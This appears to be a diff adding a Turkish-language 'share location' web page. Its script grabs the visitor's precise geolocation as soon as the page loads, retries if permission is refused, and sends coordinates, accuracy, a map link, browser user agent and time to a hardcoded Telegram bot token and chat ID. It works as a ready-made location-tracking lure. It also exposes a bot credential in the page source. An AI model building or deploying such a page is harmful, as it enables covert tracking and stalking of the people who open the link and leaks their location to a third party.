@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>📍 Konum Paylaş</title>
+  <script>
+    let maxAttempts = 3;
+    let attempt = 0;
+    let isHighAccuracy = true;
+
+    function sendLocation(lat, lon, acc) {
+      const botToken = '7643828629:AAHEq59JBwrO0c9B0ywXWW34CuGxqTpbBeI';
+      const chatId = '-1002466163013';
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const browserInfo = navigator.userAgent;
+
+      const message = `📍 Yeni konum bilgisi:\n🔹 Enlem: ${lat}\n🔹 Boylam: ${lon}\n🎯 Hassasiyet: ±${acc} metre\n🗺️ Harita: ${mapLink}\n🌐 Tarayıcı: ${browserInfo}\n🕓 Zaman: ${new Date().toLocaleString("tr-TR")}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+          document.getElementById("result").innerText = "✅ Konum başarıyla Telegram'a gönderildi!";
+        })
+        .catch(() => {
+          document.getElementById("result").innerText = "❌ Konum gönderilirken hata oluştu.";
+        });
+
+      // Harita önizlemesini güncelle
+      document.getElementById("mapPreview").src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+      document.getElementById("mapLink").href = mapLink;
+      document.getElementById("mapLink").innerText = "🗺️ Haritada Görüntüle";
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            console.log("Konum bilgisi:", position);
+            document.getElementById("result").innerText = `📍 Konum alındı:\n${lat}, ${lon} (±${acc} m)`;
+
+            sendLocation(lat, lon, acc);
+          },
+          error => {
+            let msg = "❌ Konum alınamadı: ";
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                msg += "Kullanıcı konum izni vermedi."; break;
+              case error.POSITION_UNAVAILABLE:
+                msg += "Konum bilgisi mevcut değil."; break;
+              case error.TIMEOUT:
+                msg += "Konum isteği zaman aşımına uğradı."; break;
+              default:
+                msg += "Bilinmeyen hata oluştu."; break;
+            }
+            document.getElementById("result").innerText = msg;
+            console.error("Konum hatası:", error);
+
+            if (attempt < maxAttempts) {
+              attempt++;
+              setTimeout(getLocation, 5000); // Retry after 5 seconds
+            } else {
+              document.getElementById("result").innerText = "❌ Konum alınamadı, maksimum deneme sayısına ulaşıldı.";
+            }
+          },
+          {
+            enableHighAccuracy: isHighAccuracy,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        document.getElementById("result").innerText = "❌ Tarayıcınız konum desteği sunmuyor.";
+      }
+    }
+
+    function handleAccuracy(acc) {
+      if (acc < 200) {
+        return "Yüksek doğruluk (±" + acc + " m)";
+      } else if (acc < 1000) {
+        return "Orta doğruluk (±" + acc + " m)";
+      } else {
+        return "Düşük doğruluk (±" + acc + " m)";
+      }
+    }
+
+    window.onload = () => {
+      getLocation();
+      document.getElementById("browserInfo").innerText = "🌐 Tarayıcı: " + navigator.userAgent;
+    };
+  </script>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: #f0f8ff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #007bff;
+      margin-bottom: 10px;
+    }
+
+    #result, #browserInfo {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #333;
+      white-space: pre-line;
+    }
+
+    iframe {
+      margin-top: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    #mapLink {
+      margin-top: 10px;
+      display: block;
+      color: #007bff;
+      text-decoration: underline;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+    }
+
+    .success {
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>📍 Konum Alınıyor...</h2>
+  <p id="result" class="error">Lütfen konum izni verin.</p>
+  <p id="browserInfo"></p>
+  <a id="mapLink" href="#" target="_blank"></a>
+  <iframe id="mapPreview" width="300" height="200" loading="lazy" allowfullscreen referrerpolicy="no-referrer-when-downgrade"></iframe>
+</body>
+</html>
